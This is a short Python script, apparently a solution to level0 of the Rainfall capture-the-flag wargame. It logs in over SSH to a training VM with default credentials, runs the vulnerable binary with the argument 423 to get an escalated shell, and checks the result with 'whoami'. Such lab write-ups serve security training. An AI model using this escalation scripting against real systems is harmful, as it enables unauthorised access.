#!/usr/bin/env python3
import paramiko
import time
import sys

HOST = "172.22.112.1"  # ← À adapter avec ton IP réelle
PORT = 4242
USERNAME = "level0"
PASSWORD = "level0"

def run_exploit():
    print("[*] Connexion SSH à la VM Rainfall...")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, port=PORT, username=USERNAME, password=PASSWORD)

    chan = ssh.invoke_shell()
    time.sleep(1)
    chan.recv(1024)

    print("[*] Exécution de './level0 423' pour déclencher le shell...")
    chan.send("./level0 423\n")
    time.sleep(1)

    print("[*] Tentative d'exécution de 'whoami' dans le shell escaladé...")
    chan.send("whoami\n")
    time.sleep(1)

    output = chan.recv(4096).decode()
    print("[*] Résultat de 'whoami' :")
    print(output)

    print("[*] Exploitation terminée.")
    ssh.close()

if __name__ == "__main__":
    try:
        run_exploit()
    except Exception as e:
        print(f"[!] Erreur : {e}")
        sys.exit(1)
